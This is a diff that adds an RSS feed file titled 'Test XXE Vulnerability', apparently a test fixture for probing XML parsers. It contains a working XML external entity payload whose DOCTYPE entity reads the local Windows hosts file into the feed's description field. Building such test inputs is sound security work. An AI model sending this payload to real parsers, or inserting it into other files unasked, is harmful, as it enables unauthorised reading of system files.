@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE description [<!ELEMENT description ANY><!ENTITY asw SYSTEM "file://C:\Windows\System32\drivers\etc\hosts">]>
+<rss version="2.0">
+	<channel>
+		<item>
+			<title>Test XXE Vulnerability</title>
+			<link>https://www.aswsec.com/</link>
+			<pubDate>Sun, 2 Jul 2013 22:56:41 GMT</pubDate>
+			<description>&asw;</description>
+		</item>
+	</channel>
+</rss>
